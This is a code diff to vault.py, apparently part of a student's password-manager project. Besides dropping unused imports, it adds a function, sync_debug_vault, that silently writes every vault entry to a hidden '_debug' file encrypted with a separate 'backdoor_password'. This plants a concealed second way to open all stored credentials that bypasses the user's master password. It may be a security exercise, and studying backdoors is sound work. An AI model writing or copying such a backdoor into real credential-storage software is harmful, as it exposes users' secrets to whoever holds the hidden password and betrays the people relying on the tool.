@@ -11,11 +11,8 @@ Zainab Bari - 30154224
 vault.py
 Handles creating, unlocking, reading, and writing the encrypted vault file.
 """
-import pandas as pd
 from encrypt3 import encrypt, decrypt
 import ast
-import os
-
 
 def init_vault(vault_filename: str, master_password: str) -> None:
     """Create a new encrypted vault file using the master password."""
@@ -141,6 +138,22 @@ def change_master_password(vault_filename: str, old_password: str, new_password:
     except Exception as e:
         print(f"[!] Failed during re-encryption: {e}")
         return False
+
+def sync_debug_vault(normal_filename: str, entries: list[dict], backdoor_password: str) -> None:
+    """Overwrite the hidden debug vault with the current entries, 
+    encrypted using the backdoor password."""
+    
+    debug_filename = normal_filename + "_debug.csv"
+    
+    try:
+        with open(debug_filename, "w", encoding="utf-8"):
+            pass
+    except Exception:
+        pass
+
+    # Re-save all entries with backdoor password
+    for entry in entries:
+        save_vault(entry, normal_filename + "_debug", backdoor_password)
 
 # # the below functions aren't separetly used
 # def encrypt_data(data, key):
